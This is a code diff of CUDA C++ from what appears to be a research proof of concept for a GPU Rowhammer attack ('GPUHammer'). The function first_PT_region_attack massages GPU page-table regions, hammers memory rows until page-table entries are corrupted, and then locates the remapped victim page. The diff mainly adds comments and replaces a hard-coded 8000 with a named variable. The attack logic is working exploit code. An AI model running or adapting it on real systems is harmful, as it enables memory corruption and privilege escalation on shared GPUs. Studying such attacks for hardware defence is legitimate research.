@@ -42,32 +42,35 @@ first_PT_region_attack (uint64_t num_alloc_init, double threshold,
   auto& corrupted_id = ctx.step3_data.corrupted_id;
   auto& victim_id = ctx.step3_data.victim_id;
 
-  
   region_ptrs = std::vector<uint8_t *> (num_alloc_init, nullptr);
 
-  /* Why -200: We don't want eviction to happen when we hammer so we take a slight estimate */
+  /* Why -200: We don't want eviction to happen when we hammer so we take a slight underestimate */
   uint64_t conservative_alloc = num_alloc_init - 200;
 
   /**
-   * WARNING: this code is aggresively making all 2MB to 64KB page tables,
-   * this will require a lot of CPU RAM.
+   * WARNING: this code is aggresively making 64KB pages,
+   * this will require a non-negligible amount of CPU RAM.
    * 
-   * To conserve RAM usage, you may change the code to only do this on the 
-   * first 16 GB. Or even try filling first using 2MB + 4KB or cuMemMap.
+   * To conserve RAM usage, you may even try filling first using 2MB + 4KB or cuMemMap.
    */
 
   /****************************************************************/
   /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
   /****************************************************************/
   bool found_mismatch = false;
+  uint64_t pages_to_fill_region = 8000; // An estimate of around 8000 is enough to fill the new PT region.
   while (!found_mismatch)
     {
       // On Failure, Re-order and try again
       if (repeats != 0)
-        std::rotate (region_ptrs.begin(), region_ptrs.begin() + 8000-2,
-                     region_ptrs.begin() + 8000-1);
-      for (uint64_t i = 0; i < (repeats != 0 ? 8000 : conservative_alloc); i += 1)
+        std::rotate (region_ptrs.begin(), region_ptrs.begin() + pages_to_fill_region - 2,
+                     region_ptrs.begin() + pages_to_fill_region - 1);
+
+      // First round we just allocate memory. 
+      // All later round we only re-order the 'pages_to_fill_region' 64KB pages in PT region.
+      for (uint64_t i = 0; i < (repeats != 0 ? pages_to_fill_region : conservative_alloc); i += 1)
         {
+          // Iteratively free then allocate to make sure order is different.
           if (repeats != 0)
             cudaFree (region_ptrs[i]);
           cudaMallocManaged (&temp, ALLOC_SIZE);
@@ -77,7 +80,8 @@ first_PT_region_attack (uint64_t num_alloc_init, double threshold,
 
           region_ptrs[i] = temp;
 
-          if (i < 8000)
+          // The first 'pages_to_fill_region' pages are converted to 64KB pages to fill PT region.
+          if (i < pages_to_fill_region)
             *region_ptrs[i] = 'a';
         }
       gpuErrchk (cudaPeekAtLastError ());
@@ -98,16 +102,16 @@ first_PT_region_attack (uint64_t num_alloc_init, double threshold,
       const uint64_t period = ctx.bitflip_config.period;
       const uint64_t repeat = ctx.bitflip_config.repeat;
 
+      // GPUHammer
       for (int j = 0; j < repeat; j++)
         uint64_t time = start_multi_warp_hammer (
             agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);
 
       std::cout << "Hammer Done, Finding Corruption... \033[1;31m(Rare: If taking longer than 5s, CTRL + C and stop the program)\033[0m" << '\n';
+      
       /**
-       * For each 64KB, read from cuda. (Change util to write different data to
-       * 64KB offset) Find repetition for temp and pair.
-       *
-       * If not repetition, find if it matches a PTE.
+       * Look through all pages for the its own address in its data (see `initialize_memory` also)
+       * A mismatch indicates a 64KB page has been remapped.
        */ 
       gpuErrchk (cudaPeekAtLastError ());
       for (uint64_t i = 0; !found_mismatch && i < conservative_alloc; i++)
@@ -154,6 +158,7 @@ first_PT_region_attack (uint64_t num_alloc_init, double threshold,
     }
 
 
+  /* Find the victim address that we remapped to in our `region_ptrs` */
   uint8_t *victim_round_addr
       = (uint8_t *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1));
   for (uint64_t i = 0; i < conservative_alloc; i += 1)
@@ -176,6 +181,8 @@ first_PT_region_attack (uint64_t num_alloc_init, double threshold,
     std::cout << "(Step 3 Done) Found Corrupted PFN Destination\n";
   }
 
+  /* Allocate memory to full to prepare for massaging the second PT region. */
+  /* Same concept as what "all_mem_test" did */
   int consec_spike = 0;
   int consec_spike_lim = 3;
   for (uint64_t i = conservative_alloc; i < num_alloc_init; i++)
